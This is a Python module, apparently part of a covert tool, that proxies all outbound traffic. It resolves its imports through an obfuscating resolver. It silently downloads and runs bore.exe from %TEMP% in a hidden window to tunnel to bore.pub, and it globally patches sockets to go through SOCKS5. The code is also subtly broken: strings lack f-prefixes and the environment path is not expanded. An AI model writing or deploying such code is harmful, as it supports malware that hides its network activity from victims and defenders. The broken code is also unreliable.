from core.resolver import (Resolver, _SUBPROCESS, _THREADING, _TIME)
subprocess = Resolver.get_mod(_SUBPROCESS)
threading = Resolver.get_mod(_THREADING)
time = Resolver.get_mod(_TIME)

from core.resolver import (Resolver, _SOCKET, _REQUESTS)
socket = Resolver.get_mod(_SOCKET)
requests = Resolver.get_mod(_REQUESTS)

"""
core/proxy_manager.py - Global proxy for all modules
"""

import socks

class ProxyManager:
    """Manages SOCKS5 proxy for all outbound traffic"""

    def __init__(self):
        self.proxy_host = None
        self.proxy_port = None
        self.proxy_enabled = False
        self.original_socket = socket.socket

    def start_bore_proxy(self):
        "Start bore.pub SOCKS5 proxy"
        try:

            def run_bore():
                try:

                    subprocess.run([
                        "powershell", "-Command",
                        "Invoke-WebRequest -Uri https://github.com/ekzhang/bore/releases/latest/download/bore.exe -OutFile $env:TEMP\\\\bore.exe"
                    ], capture_output=True)

                    self.proxy_process = subprocess.Popen(
                        ["$env:TEMP\\\\bore.exe", "socks", "--to", "bore.pub"],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        creationflags=0x08000000
                    )

                    time.sleep(2)

                except Exception as e:
                    print("[Proxy] Bore error: {e}")

            threading.Thread(target=run_bore, daemon=True).start()
            return True
        except:
            return False

    def enable_proxy(self, host="127.0.0.1", port=1080):
        """Enable SOCKS5 proxy for all sockets"""
        try:
            socks.set_default_proxy(socks.SOCKS5, host, port)
            socket.socket = socks.socksocket
            self.proxy_enabled = True
            self.proxy_host = host
            self.proxy_port = port

            test = requests.get("https://api.ipify.org", timeout=5)
            print("[Proxy] Enabled, external IP: {test.text}")
            return True
        except Exception as e:
            print("[Proxy] Failed: {e}")
            return False

    def disable_proxy(self):
        """Disable proxy and restore original socket"""
        socket.socket = self.original_socket
        self.proxy_enabled = False

    def proxy_request(self, method, url, **kwargs):
        """Make proxied request"""
        if self.proxy_enabled:
            if 'proxies' not in kwargs:
                kwargs['proxies'] = {
                    'http': "socks5://{self.proxy_host}:{self.proxy_port}",
                    'https': "socks5://{self.proxy_host}:{self.proxy_port}"
                }
        return requests.request(method, url, **kwargs)

proxy_manager = ProxyManager()